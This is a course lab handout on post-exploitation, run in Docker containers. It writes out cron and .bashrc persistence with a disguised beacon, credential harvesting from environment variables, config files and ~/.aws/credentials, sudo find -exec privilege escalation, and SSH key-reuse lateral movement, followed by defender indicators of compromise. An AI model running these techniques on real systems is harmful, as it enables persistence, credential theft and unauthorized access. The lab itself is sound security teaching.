---
title: "Lab 09 — Post-Exploitation & Persistence Mechanisms"
course: SCIA-472
week: 10
difficulty: "⭐⭐⭐"
estimated_time: "75–90 min"
tags:
  - post-exploitation
  - persistence
  - privilege-escalation
  - lateral-movement
  - credential-harvesting
---

# Lab 09 — Post-Exploitation & Persistence Mechanisms

| Field | Value |
|---|---|
| **Course** | SCIA-472 — Ethical Hacking & Penetration Testing |
| **Week** | 10 |
| **Difficulty** | ⭐⭐⭐ |
| **Estimated Time** | 75–90 minutes |
| **Prerequisites** | Labs 01–08 completed; Docker running |

## Overview

After initial access, attackers establish **persistence** (survive reboots), escalate privileges, harvest credentials, and prepare for lateral movement. Students simulate these behaviors safely in isolated containers to understand what defenders need to detect.

This lab covers:

- Persistence via cron and `.bashrc`
- Credential harvesting from environment variables, config files, and cloud credential stores
- Privilege escalation discovery (SUID binaries, sudo misconfigurations)
- Lateral movement via SSH key reuse
- Indicators of compromise (IOC) identification

---

!!! warning "Ethical Use — Read Before Proceeding"
    All techniques in this lab are demonstrated in **isolated containers you create**. These techniques are **illegal on systems without written authorization**. Post-exploitation access on unauthorized systems carries severe criminal penalties under the CFAA (18 U.S.C. § 1030) and equivalent statutes. Every command in this lab targets containers running on your own machine only.

---

## Part 1 — Persistence via Cron

Cron-based persistence is one of the most common techniques attackers use to survive reboots. A malicious script is hidden in a non-obvious directory and scheduled to run regularly.

### Step 1.1 — Simulate Persistence Establishment

```bash
docker run --rm ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq cron 2>/dev/null

# SIMULATED attacker persistence
mkdir -p /tmp/.hidden
cat > /tmp/.hidden/beacon.sh << 'SCRIPT'
#!/bin/bash
# Simulated C2 beacon (in real attack this would contact attacker server)
echo \"\$(date): beacon from \$(hostname) as \$(whoami)\" >> /tmp/.hidden/beacon.log
SCRIPT
chmod +x /tmp/.hidden/beacon.sh

# Add to crontab
(crontab -l 2>/dev/null; echo '* * * * * /tmp/.hidden/beacon.sh') | crontab -

echo '=== Persistence established ==='
echo 'Crontab entries:'
crontab -l
echo ''
echo 'Hidden directory:'
ls -la /tmp/.hidden/"
```

!!! success "Expected Output"
    Cron entry added for every minute execution. Hidden directory `/tmp/.hidden/` created with `beacon.sh`.

📸 **Screenshot checkpoint 09a** — Capture the full terminal showing the cron entry and the hidden directory listing.

---

### Step 1.2 — Persistence via `.bashrc`

Attackers also modify shell initialization files so their payload runs every time an interactive shell opens.

```bash
docker run --rm ubuntu:22.04 bash -c "
echo '=== Bashrc persistence technique ==='
tail -5 /root/.bashrc

# Attacker adds to .bashrc
echo '' >> /root/.bashrc
echo '# System update check' >> /root/.bashrc
echo 'nohup /tmp/.hidden/beacon.sh &>/dev/null &' >> /root/.bashrc

echo ''
echo 'After modification:'
tail -5 /root/.bashrc
echo ''
echo 'Now runs every time root logs in'"
```

!!! note "What to Observe"
    The entry is disguised as a `# System update check` comment. This social engineering within configuration files is a classic defense evasion technique.

📸 **Screenshot checkpoint 09b** — Capture the before and after `.bashrc` tail output.

---

## Part 2 — Credential Harvesting

Credential harvesting targets environment variables, application config files, and cloud credential stores. Attackers prioritize these locations immediately after gaining shell access.

### Step 2.1 — Harvest Credentials from Environment and Config Files

```bash
docker run --rm ubuntu:22.04 bash -c "
# Simulate a web app that stores credentials insecurely
export DB_PASSWORD='supersecret_prod_2024'
export AWS_SECRET_KEY='AKIAIOSFODNN7EXAMPLE'
mkdir -p /var/www/app
cat > /var/www/app/config.php << 'PHP'
<?php
// Database configuration
\$db_host = 'mysql.internal.corp';
\$db_user = 'webapp';
\$db_pass = 'WebApp_Prod_P@ss2024';
\$api_key = 'sk-1234567890abcdef';
?>
PHP
mkdir -p /root/.aws
cat > /root/.aws/credentials << 'AWS'
[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS
chmod 600 /root/.aws/credentials

echo '=== CREDENTIAL HARVESTING SIMULATION ==='
echo '--- Environment variables ---'
env | grep -E 'PASSWORD|SECRET|KEY|TOKEN|PASS'
echo ''
echo '--- Config file credentials ---'
grep -r 'pass\|key\|secret' /var/www/app/ 2>/dev/null
echo ''
echo '--- AWS credentials ---'
cat /root/.aws/credentials"
```

!!! success "Expected Output"
    Demonstrates multiple credential locations attackers check — environment variables expose `DB_PASSWORD` and `AWS_SECRET_KEY`, config.php reveals database credentials, and `~/.aws/credentials` shows cloud access keys.

📸 **Screenshot checkpoint 09c** — Capture all three sections: environment variables, config file credentials, and AWS credentials.

---

## Part 3 — Privilege Escalation Discovery

After gaining initial access as a low-privilege user, attackers enumerate the system for escalation paths.

### Step 3.1 — SUID Binary Enumeration

SUID binaries run with the file owner's privileges (often root) regardless of who executes them.

```bash
docker run --rm ubuntu:22.04 bash -c "
useradd -m lowpriv && echo 'lowpriv:password' | chpasswd

echo '=== SUID binaries (potential escalation vectors) ==='
find / -perm -4000 -type f 2>/dev/null

echo ''
echo '=== World-writable directories ==='
find /tmp /var /etc -perm -0002 -type d 2>/dev/null | head -10

echo ''
echo '=== Interesting files in home dirs ==='
find /home /root -name '*.txt' -o -name '*.cfg' -o -name '*.conf' 2>/dev/null | head -10"
```

📸 **Screenshot checkpoint 09d** — Capture SUID binary list and world-writable directories.

---

### Step 3.2 — Sudo Misconfiguration Detection

A misconfigured sudoers entry granting `NOPASSWD` access to interactive binaries is a critical finding in penetration tests.

```bash
docker run --rm ubuntu:22.04 bash -c "
useradd -m lowpriv
echo 'lowpriv:password' | chpasswd

# Misconfigured sudo - common finding in pentests
apt-get update -qq && apt-get install -y -qq sudo 2>/dev/null
echo 'lowpriv ALL=(ALL) NOPASSWD: /usr/bin/find' >> /etc/sudoers
echo 'lowpriv ALL=(ALL) NOPASSWD: /usr/bin/vim' >> /etc/sudoers

echo '=== Checking sudo permissions as lowpriv ==='
su lowpriv -s /bin/bash -c 'sudo -l 2>/dev/null'
echo ''
echo '=== Exploit: sudo find -exec /bin/bash === '
echo '(GTFOBins: any NOPASSWD sudo binary = potential root)'
su lowpriv -s /bin/bash -c 'sudo find /etc -name passwd -exec id {} \; 2>/dev/null | head -3'
echo ''
echo 'find with -exec runs commands AS ROOT = privilege escalation'"
```

!!! danger "Key Concept — GTFOBins"
    [GTFOBins](https://gtfobins.github.io/) catalogs hundreds of Unix binaries that can be abused for privilege escalation, file reads, and shell escapes when granted `NOPASSWD` sudo access. Even seemingly harmless utilities like `find`, `vim`, `less`, and `awk` provide full root shells.

📸 **Screenshot checkpoint 09e** — Capture the `sudo -l` output showing misconfigured entries and the `id` command executing as root via `find -exec`.

---

## Part 4 — Lateral Movement Simulation

With credentials or keys from one system, attackers move to adjacent systems without re-exploiting vulnerabilities.

### Step 4.1 — SSH Key Reuse (Common Lateral Movement Technique)

In enterprises, the same SSH key pair is frequently deployed across many servers. One compromised key provides access to all systems sharing that authorized key.

```bash
docker network create lateral-lab
docker run -d --name server-a --network lateral-lab ubuntu:22.04 bash -c "
  apt-get update -qq && apt-get install -y -qq openssh-server 2>/dev/null
  useradd -m admin && echo 'admin:P@ss2024' | chpasswd
  mkdir -p /home/admin/.ssh /run/sshd
  ssh-keygen -t rsa -f /home/admin/.ssh/id_rsa -N '' -q
  cat /home/admin/.ssh/id_rsa.pub >> /home/admin/.ssh/authorized_keys
  chmod 700 /home/admin/.ssh && chmod 600 /home/admin/.ssh/authorized_keys
  chown -R admin:admin /home/admin/.ssh
  echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config
  ssh-keygen -A -q && /usr/sbin/sshd -D"

docker run -d --name server-b --network lateral-lab ubuntu:22.04 bash -c "
  apt-get update -qq && apt-get install -y -qq openssh-server 2>/dev/null
  useradd -m admin
  mkdir -p /run/sshd && ssh-keygen -A -q && /usr/sbin/sshd -D"

sleep 8
IP_A=$(docker inspect server-a --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
IP_B=$(docker inspect server-b --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
echo "Server A: $IP_A | Server B: $IP_B"

# Set up authorized_keys on server-b using server-a's key
docker exec server-a bash -c "cat /home/admin/.ssh/id_rsa.pub" | \
  docker exec -i server-b bash -c "mkdir -p /home/admin/.ssh && cat >> /home/admin/.ssh/authorized_keys && chmod 700 /home/admin/.ssh && chmod 600 /home/admin/.ssh/authorized_keys && chown -R admin:admin /home/admin/.ssh"

echo '=== Testing key reuse lateral movement ==='
docker exec server-a bash -c "su admin -s /bin/bash -c 'ssh -o StrictHostKeyChecking=no -i /home/admin/.ssh/id_rsa admin@$IP_B echo LATERAL_MOVEMENT_SUCCESS' 2>/dev/null"

docker stop server-a server-b && docker rm server-a server-b
docker network rm lateral-lab
```

!!! success "Expected Output"
    ```
    LATERAL_MOVEMENT_SUCCESS
    ```
    SSH key reuse enabled lateral movement from server-a to server-b without any additional exploitation.

📸 **Screenshot checkpoint 09f** — Capture the `LATERAL_MOVEMENT_SUCCESS` output and the IP addresses of both servers.

---

## Part 5 — Evidence of Compromise (Defender Perspective)

Understanding what post-exploitation leaves behind is essential for defenders building detection rules and monitoring strategies.

### Step 5.1 — What Defenders Look For

```bash
docker run --rm python:3.11-slim python3 -c "
iocs = {
    'Persistence IOCs': [
        'New cron entries (esp. in /var/spool/cron or /etc/cron.d)',
        'New startup scripts in /etc/init.d or systemd',
        'New authorized_keys entries',
        'New user accounts created outside normal process',
        '.bashrc or .profile modifications',
    ],
    'Credential Access IOCs': [
        'Access to /etc/shadow (outside normal accounts)',
        'Memory scrapers in /proc/PID/mem access',
        'Config file reads in unusual process context',
        'Env variable dumps via /proc/PID/environ',
    ],
    'Lateral Movement IOCs': [
        'SSH logins from internal IPs at unusual hours',
        'Same account logging into multiple servers within seconds',
        'SMB connections without preceding authentication',
        'Use of PsExec, WinRM, or DCOM from unexpected sources',
    ],
    'Defense Evasion IOCs': [
        'Processes with deleted executables (/proc/PID/exe -> deleted)',
        'Files in /tmp or /dev/shm with execute bit',
        'Base64-encoded commands in shell history',
        'Log clearing (last login shows no history)',
    ],
}
for category, indicators in iocs.items():
    print(f'--- {category} ---')
    for ioc in indicators:
        print(f'  \u2022 {ioc}')
    print()
"
```

📸 **Screenshot checkpoint 09g** — Capture the full IOC reference list output.

---

## Cleanup

```bash
docker system prune -f
```

---

## Assessment — Screenshot Checklist

Submit all seven screenshots with your lab report. Each screenshot must show your terminal with a visible timestamp or hostname.

| # | Screenshot ID | Required Content |
|---|---|---|
| 1 | **09a** | Cron persistence established — crontab entry + hidden directory listing |
| 2 | **09b** | `.bashrc` persistence — before and after modification |
| 3 | **09c** | Credentials harvested — environment variables + config.php + AWS credentials |
| 4 | **09d** | SUID enumeration and world-writable directories |
| 5 | **09e** | Sudo misconfiguration — `sudo -l` output + `id` executing as root via `find -exec` |
| 6 | **09f** | Lateral movement — `LATERAL_MOVEMENT_SUCCESS` with server IPs visible |
| 7 | **09g** | IOC reference list — all four categories displayed |

---

## Post-Exploitation Technique Timeline

In your lab report, construct a technique timeline in this format:

| T+ Time | Phase | Technique | MITRE ATT&CK ID | Evidence Left |
|---|---|---|---|---|
| T+0 min | Persistence | Cron beacon | T1053.003 | `/var/spool/cron/` |
| T+1 min | Persistence | `.bashrc` modification | T1546.004 | `~/.bashrc` diff |
| T+2 min | Credential Access | Env var harvesting | T1552.007 | Process history |
| T+3 min | Credential Access | Config file harvest | T1552.001 | File access logs |
| T+4 min | Privilege Escalation | SUID enumeration | T1548.001 | — |
| T+5 min | Privilege Escalation | Sudo find exploit | T1548.003 | auth.log |
| T+6 min | Lateral Movement | SSH key reuse | T1021.004 | SSH logs |

---

## Reflection Questions

Answer each question in **150–200 words** in your lab report.

!!! question "Reflection 1 — Persistence Detection"
    Attackers hide beacons in `/tmp/.hidden` and disguise cron entries as `# System update check`. What monitoring would detect these persistence mechanisms? Name **two specific log sources or tools** a defender would use.

!!! question "Reflection 2 — AWS Credential Exposure"
    You found AWS credentials in `/root/.aws/credentials`. If these are real production credentials, what is the immediate damage an attacker could cause? What is AWS's recommended solution for applications that need AWS access?

!!! question "Reflection 3 — Sudo NOPASSWD Risk"
    The sudo misconfiguration allowed `sudo find` without a password. GTFOBins lists hundreds of similar misconfigurations. Why is a `NOPASSWD` sudo entry for any interactive command dangerous, even if the command itself seems harmless?

!!! question "Reflection 4 — SSH Key Management"
    SSH key reuse is common in enterprises where the same admin SSH key is deployed across many servers. A single compromised admin workstation gives lateral movement to all servers. What is the proper key management practice to prevent this?

---

!!! tip "Grading Rubric"
    | Component | Points |
    |---|---|
    | Screenshots (7 × ~6 pts each) | 40 pts |
    | Post-exploitation technique timeline (complete, correct ATT&CK IDs) | 20 pts |
    | Reflection questions (4 × 10 pts each) | 40 pts |
    | **Total** | **100 pts** |
